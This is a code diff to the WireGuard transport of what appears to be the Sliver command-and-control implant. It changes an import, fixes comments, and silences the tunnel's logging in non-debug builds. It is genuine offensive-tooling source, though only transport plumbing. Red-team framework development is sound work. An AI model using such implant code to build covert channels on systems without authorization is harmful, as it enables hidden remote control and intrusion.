@@ -34,10 +34,10 @@ import (
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 
+	"github.com/bishopfox/sliver/implant/sliver/netstack"
 	"github.com/golang/protobuf/proto"
 	"golang.zx2c4.com/wireguard/conn"
 	"golang.zx2c4.com/wireguard/device"
-	"golang.zx2c4.com/wireguard/tun/netstack"
 )
 
 var (
@@ -45,7 +45,7 @@ var (
 	serverTunPort = 8888
 )
 
-// socketWGWriteEnvelope - Writes a message to the TLS socket using length prefix framing
+// socketWGWriteEnvelope - Writes a message to the wireguard socket using length prefix framing
 // which is a fancy way of saying we write the length of the message then the message
 // e.g. [uint32 length|message] so the receiver can delimit messages properly
 func socketWGWriteEnvelope(connection net.Conn, envelope *pb.Envelope) error {
@@ -77,7 +77,7 @@ func socketWGWritePing(connection net.Conn) error {
 	return socketWGWriteEnvelope(connection, &envelope)
 }
 
-// socketWGReadEnvelope - Reads a message from the TLS connection using length prefix framing
+// socketWGReadEnvelope - Reads a message from the wireguard connection using length prefix framing
 func socketWGReadEnvelope(connection net.Conn) (*pb.Envelope, error) {
 	dataLengthBuf := make([]byte, 4) // Size of uint32
 	if len(dataLengthBuf) == 0 || connection == nil {
@@ -136,7 +136,12 @@ func wgSocketConnect(address string, port uint16) (net.Conn, *device.Device, err
 		// {{end}}
 	}
 
-	dev := device.NewDevice(tun, conn.NewDefaultBind(), device.NewLogger(device.LogLevelVerbose, "[c2/wg] "))
+	wgLogLevel := device.LogLevelSilent
+	// {{if .Config.Debug}}
+	wgLogLevel = device.LogLevelVerbose
+	// {{end}}
+
+	dev := device.NewDevice(tun, conn.NewDefaultBind(), device.NewLogger(wgLogLevel, "[c2/wg] "))
 	wgConf := bytes.NewBuffer(nil)
 	fmt.Fprintf(wgConf, "private_key=%s\n", wgImplantPrivKey)
 	fmt.Fprintf(wgConf, "public_key=%s\n", wgServerPubKey)
